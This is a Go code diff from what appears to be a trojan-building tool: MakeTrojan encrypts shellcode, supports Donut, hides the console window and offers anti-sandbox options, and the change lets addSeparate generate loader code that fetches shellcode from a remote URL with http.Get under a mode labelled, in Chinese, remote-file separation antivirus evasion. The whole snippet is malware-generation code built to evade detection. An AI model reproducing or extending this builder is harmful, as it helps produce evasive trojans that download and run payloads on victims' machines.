@@ -26,7 +26,7 @@ type Option struct {
 	DstFile           string
 	ShellcodeEncode   string
 	Donut             bool
-	Separate          bool
+	Separate          string
 	ShellcodeLocation string
 	ShellcodeUrl      string
 	AntiSandboxOpt    AntiSandboxOption
@@ -96,8 +96,8 @@ func MakeTrojan(options Option) {
 	//加密shellcode
 	encodeShellcode(options.ShellcodeEncode, key)
 	//分离加载shellcode
-	if options.Separate {
-		addSeparate(options.ShellcodeLocation, options.ShellcodeUrl)
+	if options.Separate != "" {
+		addSeparate(options.ShellcodeLocation, options.ShellcodeUrl, options.Separate)
 	}
 	//隐藏cmd窗口
 	if options.BuildOpt.Hide {
@@ -111,7 +111,7 @@ func MakeTrojan(options Option) {
 	//清理临时文件夹
 	os.RemoveAll(TempDir)
 }
-func addSeparate(location string, url string) {
+func addSeparate(location string, url string, method string) {
 	var separateCode []string
 	fileBefore := strings.Split(location, "\\")
 	file := fileBefore[len(fileBefore)-1]
@@ -119,7 +119,7 @@ func addSeparate(location string, url string) {
 	FileCopy(path.Join(TempDir, "shellcode"), file)
 	ioutil.WriteFile(path.Join(TempDir, "shellcode"), []byte(""), os.ModePerm)
 	location = strings.ReplaceAll(location, "\\", "\\\\")
-	if url != "" {
+	if method == "远程文件分离免杀" {
 		separateCode = []string{`res, _ := http.Get("` + url + `")
 	shellcode, _ = ioutil.ReadAll(res.Body)`, `
 	"net/http"
